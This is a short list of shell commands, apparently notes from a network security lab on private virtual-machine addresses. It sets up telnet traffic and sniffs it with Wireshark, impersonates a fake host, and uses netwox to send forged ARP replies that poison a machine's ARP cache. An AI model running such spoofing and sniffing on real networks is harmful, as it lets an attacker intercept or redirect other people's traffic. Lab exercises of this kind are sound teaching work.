#Eavesdropping

ifconfig
ssh 192.168.56.103
ls
exit
sudo wireshark
sudo apt-get install xinetd telnetd
/etc/init.d/xinetd restart
telnet 192.168.56.103 23
ls
exit

#Fake machine:

ping 192.168.56.103
ping 192.168.56.104
sudo netwox 73 -i 192.168.56.104 -e 08:00:27:cd:cf:f6 -d Eth1
ping 192.168.56.104

#Attacker:

sudo netwox 33 -d Eth1 -a 08:00:27:cd:cf:f6 -b 08:00:27:78:c8:72 -c 2054 -e 2 -f 08:00:27:cd:cf:f6 -g 192.168.56.103 -h 08:00:27:78:c8:72 -i 192.168.56.103
sudo netwox 73 -i 192.168.56.104 -e 08:00:27:cd:cf:f6 -d Eth1
